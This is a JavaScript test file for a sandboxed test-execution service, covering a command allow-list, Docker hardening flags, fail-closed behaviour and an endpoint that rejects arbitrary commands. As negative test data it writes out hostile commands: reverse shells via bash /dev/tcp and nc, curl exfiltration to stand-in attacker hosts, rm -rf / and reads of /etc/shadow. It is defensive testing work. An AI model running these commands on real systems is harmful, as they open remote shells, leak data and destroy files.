import { describe, it, before, after } from "node:test";
import assert from "node:assert";
import mongoose from "mongoose";
import { app, request, generateTestToken } from "./testHelper.js";
import { initTestDb, closeTestDb } from "./testDb.js";
import {
    ALLOWED_TEST_COMMANDS,
    buildDockerRunArgs,
    executeInSandbox,
    isDockerAvailable,
} from "../src/services/sandbox.service.js";
import User from "../src/models/User.js";
import Project from "../src/models/project.js";

describe("Task 9: Sandboxed Execution & Command Lockdown (Task 2)", () => {
    let testUser;
    let userToken;
    let testProject;

    before(async () => {
        await initTestDb();
        const userId = new mongoose.Types.ObjectId();
        testUser = await User.create({
            _id: userId,
            fullName: "Sandbox Tester",
            username: `sandbox_${Date.now()}`,
            email: `sandbox_${Date.now()}@example.com`,
            password: "SecurePassword123",
        });
        userToken = generateTestToken(userId.toString(), { email: testUser.email });

        testProject = await Project.create({
            name: "Sandbox Test Project",
            repoUrl: "https://github.com/example/sandbox-test",
            repoBranch: "main",
            owner: userId,
        });
    });

    after(async () => {
        await closeTestDb();
    });

    describe("Unit: ALLOWED_TEST_COMMANDS Allow-list", () => {
        it("Contains approved standard test runners", () => {
            assert.ok(ALLOWED_TEST_COMMANDS.includes("npm test"));
            assert.ok(ALLOWED_TEST_COMMANDS.includes("npm run test"));
            assert.ok(ALLOWED_TEST_COMMANDS.includes("pytest"));
            assert.ok(ALLOWED_TEST_COMMANDS.includes("python -m pytest"));
            assert.ok(ALLOWED_TEST_COMMANDS.includes("go test ./..."));
            assert.ok(ALLOWED_TEST_COMMANDS.includes("cargo test"));
        });

        it("Is frozen to prevent runtime tampering", () => {
            assert.strictEqual(Object.isFrozen(ALLOWED_TEST_COMMANDS), true);
        });

        it("Rejects arbitrary commands not in allow-list", () => {
            const maliciousCommands = [
                "rm -rf /",
                "curl http://malicious.example.com/exfil",
                "wget http://malicious.example.com",
                "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
                "nc -e /bin/sh 10.0.0.1 4444",
                "node -e 'require(\"fs\").unlinkSync(\"/etc/passwd\")'",
                "cat /etc/shadow",
            ];

            for (const cmd of maliciousCommands) {
                assert.strictEqual(
                    ALLOWED_TEST_COMMANDS.includes(cmd),
                    false,
                    `Command "${cmd}" must NOT be allowed`
                );
            }
        });
    });

    describe("Unit: Docker Hardening Arguments (buildDockerRunArgs)", () => {
        it("Enforces security flags, dropped capabilities, and non-root user", () => {
            const args = buildDockerRunArgs({
                containerId: "test-container-uuid",
                workingDir: "C:/fake/path",
                command: "npm test",
                readOnly: true,
                user: "1000:1000",
                network: "none",
            });

            assert.ok(args.includes("--security-opt"));
            assert.ok(args.includes("no-new-privileges:true"));
            assert.ok(args.includes("--cap-drop=ALL"));
            assert.ok(args.includes("--user"));
            assert.ok(args.includes("1000:1000"));
            assert.ok(args.includes("--network=none"));
            assert.ok(args.some((arg) => arg.includes(":/workspace:ro")));
        });
    });

    describe("Unit: Fail-Closed Behavior when Docker is Offline", () => {
        it("executeInSandbox throws 'sandbox unavailable' when Docker is off and local mode is forbidden", async () => {
            const originalAllowUnsafe = process.env.ALLOW_UNSAFE_LOCAL_SANDBOX;
            const originalNodeEnv = process.env.NODE_ENV;

            try {
                process.env.ALLOW_UNSAFE_LOCAL_SANDBOX = "false";
                process.env.NODE_ENV = "production";

                // Point to a directory that exists
                await assert.rejects(
                    async () => {
                        await executeInSandbox({
                            workingDir: process.cwd(),
                            command: "npm test",
                            preferDocker: false, // Force bypass to trigger fallback check
                        });
                    },
                    (err) => {
                        assert.ok(
                            err.message.includes("sandbox unavailable") ||
                            err.message.includes("Docker daemon is not running")
                        );
                        return true;
                    }
                );
            } finally {
                process.env.ALLOW_UNSAFE_LOCAL_SANDBOX = originalAllowUnsafe;
                process.env.NODE_ENV = originalNodeEnv;
            }
        });
    });

    describe("Integration: Test Execution Endpoint Lockdown", () => {
        it("POST /api/test/:projectId/run rejects arbitrary testCommand with HTTP 400", async () => {
            const res = await request(app)
                .post(`/api/test/${testProject._id}/run`)
                .set("Authorization", `Bearer ${userToken}`)
                .send({
                    testCommand: "curl http://attacker.com/leak",
                });

            assert.strictEqual(res.status, 400);
            assert.strictEqual(res.body.success, false);
            assert.ok(res.body.message.includes("Invalid testCommand"));
        });

        it("POST /api/test/:projectId/run with valid testCommand either proceeds or fails-closed with 503", async () => {
            const res = await request(app)
                .post(`/api/test/${testProject._id}/run`)
                .set("Authorization", `Bearer ${userToken}`)
                .send({
                    testCommand: "npm test",
                });

            // If Docker is running, 202/200; if Docker is stopped and local sandbox disabled, 503 "sandbox unavailable"
            assert.ok([200, 201, 202, 503].includes(res.status));
            if (res.status === 503) {
                assert.ok(res.body.message.includes("sandbox unavailable"));
            }
        });
    });
});

